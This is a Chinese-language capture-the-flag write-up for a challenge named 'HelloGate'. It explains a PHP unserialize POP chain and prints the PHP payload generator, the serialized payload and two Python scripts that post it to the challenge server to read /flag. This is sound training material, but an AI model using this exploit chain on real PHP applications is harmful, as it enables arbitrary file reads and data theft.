## HelloGate
下载网页内容另存为jpg，发现末尾的php


![[Pasted image 20251228202852.png]]


这是一个非常经典的 **PHP 反序列化漏洞**（PHP Unserialization Vulnerability）结合 **POP 链**（Property Oriented Programming）构造的题目。

你需要构造一个恶意的序列化字符串，通过 `POST` 请求发送给服务器，利用代码中的类方法调用链读取 `flag` 文件。

### 1. 代码逻辑分析（POP 链挖掘）

我们需要找到一条从 `unserialize` 后的 `$obj->triggerMethod()` 开始，一直执行到 `file_get_contents` 的路径。

1.  **入口点：**
    `$obj = unserialize($_POST['data']);`
    `$obj->triggerMethod();`
    我们需要让 `$obj` 成为 **Class A** 的实例。

2.  **第一步（Class A）：**
    ```php
    class A {
        public $handle;
        public function triggerMethod() {
            echo "" . $this->handle; // 字符串拼接操作
        }
    }
    ```
    当把一个对象当作字符串使用（如拼接 `"" . $object`）时，会触发该对象的 `__toString()` 方法。
    **目标：** 将 `A` 的 `$handle` 属性赋值为 **Class B** 的对象。

3.  **第二步（Class B）：**
    ```php
    class B {
        public $worker;
        public function __toString() {
            return $this->worker->result; // 访问属性 result
        }
    }
    ```
    这里访问了 `$this->worker` 的 `result` 属性。如果我们让 `$worker` 成为 **Class C** 的对象，而 **Class C** 中并没有 `result` 这个属性。
    当访问不存在或不可访问的属性时，会触发 `__get()` 魔术方法。
    **目标：** 将 `B` 的 `$worker` 属性赋值为 **Class C** 的对象。

4.  **第三步（Class C - 终点）：**
    ```php
    class C {
        public $cmd;
        public function __get($name) {
            echo file_get_contents($this->cmd); // 任意文件读取
        }
    }
    ```
    这里直接执行了 `file_get_contents` 读取 `$this->cmd` 指定的文件。
    **目标：** 将 `C` 的 `$cmd` 属性赋值为 flag 的路径（通常是 `/flag` 或 `flag.php`）。

### 2. 构造 Payload (Exp)

你需要编写一段 PHP 代码来生成这个序列化字符串。

```php
<?php
// 1. 定义题目中的类结构（只需要属性即可）
class A {
    public $handle;
}

class B {
    public $worker;
    public $cmd; // 虽然题目逻辑里没用到这个，但保持结构一致
}

class C {
    public $cmd;
}

// 2. 构造对象链
$c = new C();
$c->cmd = '/flag'; // 尝试读取根目录下的 flag，如果不行尝试 flag.php

$b = new B();
$b->worker = $c; // B 触发 C 的 __get

$a = new A();
$a->handle = $b; // A 触发 B 的 __toString

// 3. 生成序列化字符串
echo serialize($a);
?>
```

**生成的 Payload 大概长这样：**
```text
O:1:"A":1:{s:6:"handle";O:1:"B":2:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:5:"/flag";}s:3:"cmd";N;}}
```

### 3. 如何发送攻击请求

由于题目代码包含 `header('Content-Type: image/jpeg');` 和 `readfile("muzujijiji.jpg");`，页面在浏览器中可能看起来像一张图片（或者因为图片数据损坏显示不出来）。你需要查看 **HTTP 响应的原始文本**。


```python
import requests

url = "http://题目地址/xxx.php" # 替换为实际题目地址

# 生成的 payload
payload = 'O:1:"A":1:{s:6:"handle";O:1:"B":2:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:5:"/flag";}s:3:"cmd";N;}}'

# 发送 POST 请求
data = {'data': payload}
response = requests.post(url, data=data)

# 打印结果
print(response.text)
# 或者如果 flag 混在乱码里，可以搜索一下
if "flag{" in response.text:
    print("\n[+] Found Flag:")
    start = response.text.find("flag{")
    end = response.text.find("}", start) + 1
    print(response.text[start:end])
```

### 4. 常见问题排查
如果在响应中没看到 flag：
1.  **路径问题**：尝试将 `$c->cmd` 改为 `flag.php`、`./flag.php` 或 `../../flag`。
2.  **编码问题**：如果使用浏览器插件或某些工具，确保 `{}` 和 `"` 等符号被正确 URL 编码。
3.  **结果位置**：由于代码先输出了图片内容，Flag 可能会被淹没在乱码中，请务必使用 `Ctrl+F` 搜索 `flag` 关键字。

```python
import requests

# 1. 设置目标 URL 
url = "https://eci-2zefero1zoo91tprpx47.cloudeci1.ichunqiu.com:80/"

# 2. 构造 Payload (基于之前的 POP 链分析)
# 这里的序列化字符串对应 A->B->C 的调用链读取 /flag
payload = 'O:1:"A":1:{s:6:"handle";O:1:"B":2:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:5:"/flag";}s:3:"cmd";N;}}'

# 3. 发送 POST 请求
# 参数名是 'data'，对应源码中的 $_POST['data']
try:
    print(f"[*]正在发送 Payload 到 {url} ...")
    response = requests.post(url, data={'data': payload}, timeout=10)

    # 4. 处理结果
    # 因为前面有一大堆图片的二进制数据，我们需要把它们过滤掉或者直接搜 flag
    content = response.content
    
    text_content = content.decode('utf-8', errors='ignore')
    
    if "flag{" in text_content:
        # 提取 flag
        start = text_content.find("flag{")
        end = text_content.find("}", start) + 1
        print("\n🎉 恭喜！找到 Flag 了：")
        print("========================================")
        print(text_content[start:end])
        print("========================================")
    else:
        print("\n[-] 没找到 flag{...} 格式的字符串。")
        print("可能是路径不对，尝试读取一下当前目录文件（把 Payload 里的 /flag 改为 ls 或 index.php 试试）")
        # 打印最后 500 个字符看看有什么线索
        print("\n响应内容的最后 500 字符：")
        print(text_content[-500:])

except Exception as e:
    print(f"[-] 发生错误: {e}")
```

![[Pasted image 20251228203110.png]]

